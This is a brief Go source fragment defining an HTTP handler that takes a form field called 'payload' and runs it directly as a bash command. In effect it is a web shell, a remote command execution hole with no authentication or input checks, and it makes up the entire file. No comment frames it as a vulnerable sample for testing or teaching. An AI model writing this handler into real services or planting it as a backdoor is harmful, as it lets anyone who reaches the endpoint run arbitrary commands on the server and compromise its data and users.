package main

import (
	"net/http"
	"os/exec"
)

func handler(w http.ResponseWriter, r *http.Request) {
	payload := r.FormValue("payload")
	_, _ = exec.Command("bash", "-c", payload).CombinedOutput()
}
